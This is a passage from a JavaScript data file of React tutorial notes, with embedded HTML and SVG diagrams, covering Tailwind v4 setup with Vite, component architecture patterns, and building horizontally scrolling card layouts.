                  <!-- Vanilla CSS -->
                  <g transform="translate(20, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="130" y="28" text-anchor="middle" class="svg-kicker">2010s · MANUAL</text>
                    <text x="130" y="52" text-anchor="middle" class="svg-title">Vanilla / Separate CSS</text>
                    <rect x="15" y="66" width="230" height="105" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs">• Heavy context switching</text>
                    <text x="25" y="106" class="svg-mono-xs">• Class naming exhaustion</text>
                    <text x="25" y="124" class="svg-mono-xs">• Unused CSS deadweight</text>
                    <text x="25" y="146" class="svg-mono-xs" style="fill:var(--danger);">Velocity: Low</text>
                  </g>

                  <!-- Bootstrap -->
                  <g transform="translate(310, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <text x="130" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2014s · OPINIONATED</text>
                    <text x="130" y="52" text-anchor="middle" class="svg-title">Bootstrap Components</text>
                    <rect x="15" y="66" width="230" height="105" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="88" class="svg-mono-xs">• Pre-built UI widgets</text>
                    <text x="25" y="106" class="svg-mono-xs">• Identical generic aesthetics</text>
                    <text x="25" y="124" class="svg-mono-xs">• Painful custom overrides</text>
                    <text x="25" y="146" class="svg-mono-xs" style="fill:var(--accent);">Flexibility: Rigid</text>
                  </g>

                  <!-- Tailwind CSS -->
                  <g transform="translate(600, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="130" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">MODERN STANDARD ✓</text>
                    <text x="130" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Tailwind Utility-First</text>
                    <rect x="15" y="66" width="230" height="105" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="88" class="svg-mono-xs">• Co-located atomic classes</text>
                    <text x="25" y="106" class="svg-mono-xs">• 100% custom design freedom</text>
                    <text x="25" y="124" class="svg-mono-xs">• Zero dead CSS (Purged)</text>
                    <text x="25" y="146" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Velocity: Lightning Fast</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "18.3",
          title: "Tailwind Version Architecture (v3 vs. v4)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Tailwind v3 vs. Tailwind v4 Architectural Changes:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Tailwind v3:</strong> Depended on PostCSS, requiring multiple config files (<code>tailwind.config.js</code>, <code>postcss.config.js</code>) and explicit <code>content: [...]</code> glob arrays to scan templates.</li>
                  <li><strong>Tailwind v4 (Modern Standard):</strong> Completely rewritten from scratch using a high-performance Rust engine (**Lightning CSS**). It features a dedicated Vite plugin (<code>@tailwindcss/vite</code>), requires zero configuration files by default, and starts up to 10× faster.</li>
                </ul>
              </li>
              <li><strong>Senior Developer Note:</strong> When reading older tutorials online, be aware that setup instructions differ between v3 and v4. Always refer to the official <code>tailwindcss.com</code> v4 documentation for modern Vite projects.</li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 18.2 · Build Engine Evolution: Tailwind v3 (PostCSS) vs. Tailwind v4 (Lightning CSS)</span>
                <span class="diagram-frame-tag">COMPILATION ENGINE BENCHMARK</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting Tailwind v3 PostCSS setup with modern Tailwind v4 Lightning CSS engine">
                  <!-- Tailwind v3 -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker">LEGACY ENGINE</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title">Tailwind CSS v3 (JavaScript/PostCSS)</text>

                    <rect x="15" y="66" width="365" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs">• Requires tailwind.config & postcss</text>
                    <text x="25" y="106" class="svg-mono-xs">• Manual content globs configuration</text>
                    <text x="25" y="124" class="svg-mono-xs">• JavaScript-based template scanner</text>
                    <text x="25" y="144" class="svg-mono-xs" style="fill:var(--text-muted);">Build Speed: Standard (~300ms HMR)</text>
                  </g>

                  <!-- Tailwind v4 -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">MODERN RUST ENGINE ✓</text>
                    <text x="200" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Tailwind CSS v4 (Lightning CSS)</text>

                    <rect x="15" y="66" width="365" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="88" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Zero config files needed by default</text>
                    <text x="25" y="106" class="svg-mono-xs">• Native Vite plugin: @tailwindcss/vite</text>
                    <text x="25" y="124" class="svg-mono-xs">• Lightning CSS (Rust compiler) built-in</text>
                    <text x="25" y="144" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Build Speed: Sub-millisecond (10x Faster)</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 19: INSTALLING & CONFIGURING TAILWIND CSS (V4) WITH REACT + VITE
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-19-install-configure-tailwind-v4",
      number: "19",
      shortLabel: "Tailwind v4 Setup with Vite",
      title: "Installing & Configuring Tailwind CSS (v4) With React + Vite",
      summary: "4-step modern Vite setup (@tailwindcss/vite), preventing the fatal vite.config.js overwrite trap, Tailwind IntelliSense, and h-screen viewport sizing.",
      subtopicLabels: ["19.1 Four-Step Setup Guide", "19.2 Fatal vite.config.js Mistake", "19.3 Tooling & Production Tips"],
      diagramCount: 2,
      sections: [
        {
          num: "19.1",
          title: "Four-Step Setup Guide (Using Vite)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The 4-Step Production Setup for React + Vite:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Step 1 · Install Packages:</strong> Run the modern v4 installer in your project directory:
                    <pre class="notes-code-block"><code>npm install tailwindcss @tailwindcss/vite</code></pre>
                  </li>
                  <li><strong>Step 2 · Configure <code>vite.config.js</code>:</strong> Import the Vite plugin and include it in your <code>plugins</code> array:
                    <pre class="notes-code-block"><code>// vite.config.js
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'

export default defineConfig({
  plugins: [react(), tailwindcss()],
})</code></pre>
                  </li>
                  <li><strong>Step 3 · Import Tailwind in <code>src/index.css</code>:</strong> Clear out starter styles and place this single line at the very top:
                    <pre class="notes-code-block"><code>@import "tailwindcss";</code></pre>
                  </li>
                  <li><strong>Step 4 · Run the Dev Server:</strong> Start your development server:
                    <pre class="notes-code-block"><code>npm run dev</code></pre>
                  </li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "19.2",
          title: "Critical Mistake to Avoid in vite.config.js",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Fatal Overwrite Pitfall:</strong>
                <ul class="notes-sub-list">
                  <li>When developers consult the official Tailwind "Using Vite" guide, they often blindly copy the entire <code>vite.config.js</code> code block and replace their existing configuration file.</li>
                  <li><strong>Why This Crashes React:</strong> The generic snippet on the documentation website is tailored for vanilla JavaScript Vite projects—it <strong>does NOT contain <code>@vitejs/plugin-react</code></strong>! Overwriting your file completely removes the React compiler plugin, causing JSX compilation to fail with fatal syntax errors.</li>
                </ul>
              </li>
              <li><strong>The Senior Engineer Rule:</strong>
                <ul class="notes-sub-list">
                  <li>Never replace existing config files blindly. <strong>Merge plugins additively</strong>: preserve <code>react()</code> and append <code>tailwindcss()</code> into the array:
                    <pre class="notes-code-block"><code>plugins: [react(), tailwindcss()]</code></pre>
                  </li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 19.1 · The Fatal vite.config.js Overwrite Trap vs. Additive Plugin Chaining</span>
                <span class="diagram-frame-tag">BUILD CONFIGURATION SAFETY GUARDRAIL</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram contrasting overwriting vite.config.js removing react with proper additive plugin chaining">
                  <!-- Bad: Overwrite -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">FATAL TRAP ❌</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Overwriting vite.config.js</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--danger);">plugins: [tailwindcss()]</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--danger);">⚠ Removed: react() plugin deleted!</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--text-muted);">Result: Vite cannot transpile JSX</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Error: Unexpected token &lt; in App.jsx</text>
                  </g>

                  <!-- Good: Additive -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Additive Plugin Chaining</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">plugins: [react(), tailwindcss()]</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--primary);">✓ react(): Transpiles JSX tags</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--accent);">✓ tailwindcss(): Scans & injects CSS</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Result: Instant HMR with live styles</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "19.3",
          title: "VS Code Tooling & Production Layout Tips",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Install Tailwind CSS IntelliSense:</strong>
                <ul class="notes-sub-list">
                  <li>In VS Code, search for the official extension: <strong>Tailwind CSS IntelliSense</strong>.</li>
                  <li>Provides real-time autocomplete suggestions, CSS color previews, and hover tooltips showing the underlying CSS rule (e.g. hovering over <code>p-4</code> displays <code>padding: 1rem;</code>).</li>
                </ul>
              </li>
              <li><strong>Viewport Layout Tip: <code>h-screen</code> vs. <code>h-full</code>:</strong>
                <ul class="notes-sub-list">
                  <li><code>h-full</code> resolves to <code>height: 100%</code>. In CSS, percentage heights only expand if every ancestor up to <code>&lt;html&gt;</code> has an explicitly declared height.</li>
                  <li>Use <strong><code>h-screen</code></strong> (which maps to <code>height: 100vh</code> or <code>100dvh</code>) on your root container to reliably fill the entire browser viewport:
                    <pre class="notes-code-block"><code>&lt;div className="h-screen w-full bg-neutral-950 text-white flex flex-col"&gt;
  &lt;Navbar /&gt;
  &lt;MainFeed /&gt;
&lt;/div&gt;</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>The Senior Path to Frontend Mastery:</strong>
                <ul class="notes-sub-list">
                  <li>To bridge the gap between learner and job-ready frontend engineer, stop writing static HTML/CSS mockups. Build production-grade interfaces by synthesizing <strong>Component Architecture + Props Data Flow + Tailwind Utility Design</strong>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 19.2 · Full-Stack React + Tailwind v4 Dev Execution Loop</span>
                <span class="diagram-frame-tag">DEVELOPER WORKFLOW & PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing the developer workflow from writing Tailwind classes in JSX to Lightning CSS compile to instant browser HMR">
                  <!-- Step 1: JSX with Tailwind -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · JSX MARKUP</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">App.jsx</text>
                    <rect x="15" y="66" width="150" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="88" class="svg-mono-xs">&lt;div</text>
                    <text x="30" y="106" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">className=</text>
                    <text x="30" y="124" class="svg-mono-xs" style="fill:var(--accent);">"h-screen p-4"</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(210, 90)">
                    <line x1="0" y1="10" x2="30" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="30,6 38,10 30,14" fill="var(--primary)"/>
                    <text x="18" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">Scan</text>
                  </g>

                  <!-- Step 2: Lightning CSS Compiler -->
                  <g transform="translate(255, 25)">
                    <rect x="0" y="0" width="190" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="95" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2 · LIGHTNING CSS</text>
                    <text x="95" y="52" text-anchor="middle" class="svg-title">Rust Engine</text>
                    <rect x="15" y="66" width="160" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="92" class="svg-mono-xs">On-Demand JIT</text>
                    <text x="25" y="112" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Generates CSS in 2ms</text>
                    <text x="25" y="128" class="svg-sub">Purges unused rules</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(450, 90)">
                    <line x1="0" y1="10" x2="30" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="30,6 38,10 30,14" fill="var(--accent)"/>
                    <text x="18" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">Vite HMR</text>
                  </g>

                  <!-- Step 3: Vite Dev Server -->
                  <g transform="translate(485, 25)">
                    <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="90" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">3 · DEV SERVER</text>
                    <text x="90" y="52" text-anchor="middle" class="svg-title">localhost:5173</text>
                    <rect x="15" y="66" width="150" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">WebSocket Push</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--primary);">Hot Replacement</text>
                    <text x="25" y="128" class="svg-sub">Zero page reload</text>
                  </g>

                  <!-- Arrow 3 -> 4 -->
                  <g transform="translate(670, 90)">
                    <line x1="0" y1="10" x2="30" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="30,6 38,10 30,14" fill="var(--success)"/>
                    <text x="18" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">DOM</text>
                  </g>

                  <!-- Step 4: Rendered Browser -->
                  <g transform="translate(705, 25)">
                    <rect x="0" y="0" width="150" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="75" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">4 · LIVE UI</text>
                    <text x="75" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Targeted Render</text>
                    <rect x="12" y="66" width="126" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="75" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Pixel-Perfect</text>
                    <text x="75" y="116" text-anchor="middle" class="svg-mono-xs">Full Viewport</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 20: COMPONENT ARCHITECTURE: FEATURE-BASED VS. ATOMIC DESIGN
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-20-component-architecture-feature-vs-atomic",
      number: "20",
      shortLabel: "Feature-Based vs Atomic Design",
      title: "Component-Based Architecture (Feature-Based vs. Atomic Design)",
      summary: "Modern banking UI case study (07-ui-project), clean App.jsx orchestration, Feature-Based vs. Atomic Design methodologies, and decomposing complex component trees.",
      subtopicLabels: ["20.1 Digital Banking UI Setup", "20.2 Feature vs Atomic Structure", "20.3 Component Tree Decomposition"],
      diagramCount: 2,
      sections: [
        {
          num: "20.1",
          title: "Project Setup & Goal (07-ui-project — Digital Banking UI)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Project Bootstrap & Tech Stack:</strong>
                <ul class="notes-sub-list">
                  <li>Initialize a clean Vite + React application (<code>07-ui-project</code>), install Tailwind CSS v4 (<code>tailwindcss</code> + <code>@tailwindcss/vite</code>), configure <code>vite.config.js</code>, and add <code>@import "tailwindcss";</code> in <code>src/index.css</code>.</li>
                  <li><strong>What We Are Building:</strong> A production-grade <strong>Digital Banking & Customer Segmentation Platform</strong> featuring a responsive top navbar, left-aligned hero callouts with action arrows, and a right-aligned horizontally scrollable card carousel (<em>"Satisfied"</em>, <em>"Underserved"</em>, <em>"Underbanked"</em>).</li>
                </ul>
              </li>
              <li><strong>The Golden Rule for <code>App.jsx</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Never dump hundreds of lines of UI markup directly into <code>App.jsx</code>.</li>
                  <li><code>App.jsx</code> serves solely as a <strong>top-level layout coordinator</strong> that imports and organizes dedicated section components.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "20.2",
          title: "Feature-Based Structure vs. Atomic Structure",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>1. Feature-Based Architecture:</strong>
                <ul class="notes-sub-list">
                  <li>Decomposes your codebase into components aligned with <strong>domain features or UI sections</strong>.</li>
                  <li><strong>Examples:</strong> The <code>Navbar</code> is one self-contained feature, <code>HeroSection</code> is a feature, <code>CustomerCarousel</code> is a feature, and <code>Footer</code> is a feature. Sub-components live within their respective feature folders.</li>
                  <li><strong>Best For:</strong> Complex web apps, dashboards, and multi-team codebases where engineers own specific functional domains.</li>
                </ul>
              </li>
              <li><strong>2. Atomic Design Methodology:</strong>
                <ul class="notes-sub-list">
                  <li>Decomposes UI into a hierarchy of granular physical units:
                    <ul class="notes-sub-list">
                      <li><strong>Atoms:</strong> Basic building blocks (<code>Button</code>, <code>Input</code>, <code>Icon</code>, <code>Badge</code>).</li>
                      <li><strong>Molecules:</strong> Combinations of atoms (<code>SearchBar</code> = Input + Button).</li>
                      <li><strong>Organisms:</strong> Distinct UI sections assembled from molecules (<code>Navbar</code>).</li>
                      <li><strong>Templates & Pages:</strong> Full-page layouts binding data to organisms.</li>
                    </ul>
                  </li>
                  <li><strong>Best For:</strong> Centralized design systems and shared cross-company UI component libraries.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 20.1 · UI Architecture Patterns: Feature-Based Structure vs. Atomic Design</span>
                <span class="diagram-frame-tag">DESIGN PATTERN COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram contrasting Feature-Based Structure with Atomic Design">
                  <!-- Feature-Based Box -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">FEATURE-BASED ARCH</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Domain Section Decomposition</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="25" y="96" class="svg-mono-xs">• Navbar Feature (Logo, Links, Auth)</text>
                    <text x="25" y="116" class="svg-mono-xs">• Hero Feature (Text, Action Arrows)</text>
                    <text x="25" y="136" class="svg-mono-xs">• Customer Carousel (Cards, Details)</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">Best for: High-velocity domain teams</text>
                  </g>

                  <!-- Atomic Structure Box -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="150" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
                    <text x="90" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">ATOMIC DESIGN</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Hierarchical Building Blocks</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="96" class="svg-mono-xs">• Atoms: &lt;Button&gt;, &lt;Heading&gt;, &lt;Icon&gt;</text>
                    <text x="25" y="116" class="svg-mono-xs">• Molecules: SearchBar (Input + Button)</text>
                    <text x="25" y="136" class="svg-mono-xs">• Organisms: Navbar (Assembled UI)</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Best for: Design systems & UI kits</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "20.3",
          title: "Breaking Down the Component Tree (07-ui-project)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Hierarchical Component Decomposition:</strong>
                <ul class="notes-sub-list">
                  <li><strong><code>App.jsx</code>:</strong> Renders top-level structural sections: <code>&lt;Section1 /&gt;</code> and <code>&lt;Section2 /&gt;</code>.</li>
                  <li><strong><code>Section1.jsx</code>:</strong> Combines <code>&lt;Navbar /&gt;</code> and <code>&lt;Page1Content /&gt;</code>.</li>
                  <li><strong><code>Page1Content.jsx</code>:</strong> Horizontally partitions the viewport into <code>&lt;LeftContent /&gt;</code> and <code>&lt;RightContent /&gt;</code>.</li>
                  <li><strong><code>LeftContent.jsx</code>:</strong> Contains <code>&lt;HeroText /&gt;</code> and <code>&lt;Arrow /&gt;</code>.</li>
                  <li><strong><code>RightContent.jsx</code>:</strong> Loops over the customer data array and mounts multiple <code>&lt;RightCard /&gt;</code> instances.</li>
                  <li><strong><code>RightCard.jsx</code>:</strong> Handles card background imagery and renders <code>&lt;RightCardContent /&gt;</code> text overlays.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 20.2 · Production Component Tree Decomposition: Digital Banking UI</span>
                <span class="diagram-frame-tag">COMPONENT HIERARCHY TREE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 240" class="arch-svg" role="img" aria-label="Hierarchical component tree from App down to Section1, Page1Content, LeftContent, RightContent, RightCard">
                  <!-- Root: App -->
                  <g transform="translate(370, 15)">
                    <rect x="0" y="0" width="140" height="38" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <text x="70" y="24" text-anchor="middle" class="svg-title">&lt;App /&gt;</text>
                  </g>

                  <!-- Down line to Section1 -->
                  <line x1="440" y1="53" x2="440" y2="75" stroke="var(--border)" stroke-width="1.8"/>

                  <!-- Section1 -->
                  <g transform="translate(360, 75)">
                    <rect x="0" y="0" width="160" height="38" rx="8" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <text x="80" y="24" text-anchor="middle" class="svg-title">&lt;Section1 /&gt;</text>
                  </g>

                  <!-- Branches to Navbar and Page1Content -->
                  <path d="M 440 113 L 440 130 L 220 130 L 220 145" fill="none" stroke="var(--border)" stroke-width="1.6"/>
                  <path d="M 440 113 L 440 130 L 640 130 L 640 145" fill="none" stroke="var(--border)" stroke-width="1.6"/>

                  <!-- Navbar -->
                  <g transform="translate(140, 145)">
                    <rect x="0" y="0" width="160" height="38" rx="8" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="80" y="24" text-anchor="middle" class="svg-mono-xs">&lt;Navbar /&gt;</text>
                  </g>

                  <!-- Page1Content -->
                  <g transform="translate(550, 145)">
                    <rect x="0" y="0" width="180" height="38" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="90" y="24" text-anchor="middle" class="svg-title">&lt;Page1Content /&gt;</text>
                  </g>

                  <!-- Sub-branches under Page1Content -->
                  <path d="M 640 183 L 640 200 L 510 200 L 510 210" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
                  <path d="M 640 183 L 640 200 L 760 200 L 760 210" fill="none" stroke="var(--accent)" stroke-width="1.5"/>

                  <!-- LeftContent -->
                  <g transform="translate(425, 210)">
                    <rect x="0" y="0" width="170" height="24" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="85" y="16" text-anchor="middle" class="svg-mono-xs">&lt;LeftContent /&gt;</text>
                  </g>

                  <!-- RightContent -->
                  <g transform="translate(675, 210)">
                    <rect x="0" y="0" width="204" height="24" rx="4" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="102" y="16" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;RightContent /&gt; (Cards)</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 21: HORIZONTAL SCROLLABLE CARDS, MULTI-LEVEL PROPS & STYLING
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-21-horizontal-scroll-props-dynamic-styles",
      number: "21",
      shortLabel: "Horizontal Scroll & Multi-Level Props",
      title: "Horizontal Scrollable Cards, Multi-Level Props & Dynamic Styling",
      summary: "Tailwind horizontal scroll layout (flex-nowrap, shrink-0, overflow-x-auto), multi-tier prop drilling, and dynamic inline styling with debugging workflows.",
      subtopicLabels: ["21.1 Horizontal Scroll Layout", "21.2 Multi-Level Prop Drilling", "21.3 Dynamic Styles & Debugging"],
      diagramCount: 2,
      sections: [
        {
          num: "21.1",
          title: "Building a Horizontally Scrollable Carousel With Tailwind",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Three Essential Flexbox Utility Rules:</strong>
                <ul class="notes-sub-list">
                  <li><strong>1. Prevent Row Wrapping (<code>flex-nowrap</code>):</strong> Standard Flexbox wraps overflow items onto a second line. Use <code>flex flex-nowrap gap-10</code> on the parent to lock all cards into a single horizontal strip.</li>
                  <li><strong>2. Prevent Card Squishing (<code>shrink-0</code>):</strong> By default, Flexbox shrinks children (<code>flex-shrink: 1</code>) to prevent overflow. Adding <strong><code>shrink-0</code></strong> to each card ensures each card retains its full designated width (e.g. <code>w-80</code>).</li>
                  <li><strong>3. Enable Horizontal Scroll (<code>overflow-x-auto</code>):</strong> Add <code>overflow-x-auto</code> to the container so users can swipe horizontally across cards on touch devices or scroll with trackpads.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 21.1 · Flexbox Horizontal Scroll Architecture: flex-nowrap + shrink-0</span>
                <span class="diagram-frame-tag">CSS FLEXBOX CAROUSEL MECHANICS</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing Flexbox horizontal scroll container using flex-nowrap, overflow-x-auto, and shrink-0 cards">
                  <!-- Outer Container -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="830" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="264" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="147" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">overflow-x-auto flex flex-nowrap</text>

                    <!-- Card 1 -->
                    <g transform="translate(20, 50)">
                      <rect x="0" y="0" width="230" height="110" rx="8" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.5"/>
                      <text x="115" y="32" text-anchor="middle" class="svg-title">Card 1: Satisfied</text>
